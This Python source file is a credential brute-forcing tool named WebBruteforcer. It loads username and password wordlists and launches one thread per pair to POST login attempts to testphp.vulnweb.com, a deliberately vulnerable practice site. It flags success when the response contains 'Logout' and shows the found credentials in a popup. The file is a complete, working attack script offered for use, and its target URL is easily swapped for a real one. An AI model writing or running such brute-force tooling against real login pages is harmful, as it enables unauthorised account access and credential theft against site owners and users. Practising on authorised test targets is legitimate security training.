import os
import requests
import threading
from pyfiglet import Figlet
from colorama import init, Fore, Style
import tkinter as tk
from tkinter import messagebox

# Initialize colorama
init()

# Event to signal when the correct credentials are found
found_event = threading.Event()

# Function to display banner
def display_banner():
    # Create a banner using pyfiglet
    f = Figlet(font='slant')
    banner = f.renderText('WebBruteforcer')
    print(Fore.MAGENTA + banner)
    print(Fore.MAGENTA + "Developed By - Anshika Awasthi")
    print(Style.RESET_ALL)

# Function to display menu
def display_menu():
    # Display a menu with options
    print(Fore.CYAN + "Bruteforce websites within minutes")
    print(Fore.CYAN + "1. testphp.vulnweb.com")
    print(Fore.CYAN + "2. Coming Soon")
    print(Fore.CYAN + "3. Coming Soon")
    print(Style.RESET_ALL)
    choice = input(Fore.CYAN + "Select a website to bruteforce (1-3): " + Style.RESET_ALL)
    return choice

# Function to brute force login
def login(username, passwd):
    # If the found_event is set, stop further attempts
    if found_event.is_set():
        return
    url = "http://testphp.vulnweb.com/userinfo.php"
    s = requests.Session()
    # Send POST request with the username and password
    output = s.post(url, data={"uname": username.strip(), "pass": passwd.strip()})
    # Check if login is successful
    if "Logout" in output.content.decode():
        print(Fore.GREEN + f"Logged In!! Username: {username.strip()} Password: {passwd.strip()}\n" + Style.RESET_ALL)
        show_popup(username.strip(), passwd.strip())
        found_event.set()  # Signal that the correct credentials are found
    else:
        print(Fore.RED + f"Wrong combination: Username: {username.strip()} Password: {passwd.strip()}" + Style.RESET_ALL)

# Function to show popup with correct credentials
def show_popup(username, password):
    # Create a popup window to show the correct credentials
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Success", f"Correct credentials found!\nUsername: {username}\nPassword: {password}")
    root.destroy()

# Main function
def main():
    display_banner()
    choice = display_menu()
    if choice == '1':
        # Replace these paths with the paths to your own credential files
        pass_file = r"D:/GIT/WebBruteforcer/credentials/pass.txt"
        user_file = r"D:/GIT/WebBruteforcer/credentials/user.txt"

        try:
            with open(pass_file, "r") as file:
                pass_list = file.readlines()
        except FileNotFoundError:
            print(f"Error: {pass_file} not found in the current directory.")
            return

        try:
            with open(user_file, "r") as file:
                user_list = file.readlines()
        except FileNotFoundError:
            print(f"Error: {user_file} not found in the current directory.")
            return

        threads = []
        # Create a thread for each username and password combination
        for username in user_list:
            for passwd in pass_list:
                t = threading.Thread(target=login, args=(username, passwd))
                t.start()
                threads.append(t)

        # Wait for all threads to complete
        for t in threads:
            t.join()

        if not found_event.is_set():
            print(Fore.CYAN + "No valid credentials found." + Style.RESET_ALL)

    else:
        print(Fore.CYAN + "This feature is coming soon. Stay tuned!" + Style.RESET_ALL)

    print(Fore.CYAN + "Thank you for using the tool. Stay updated on github.com/awasthiansh/WebBruteforcer" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
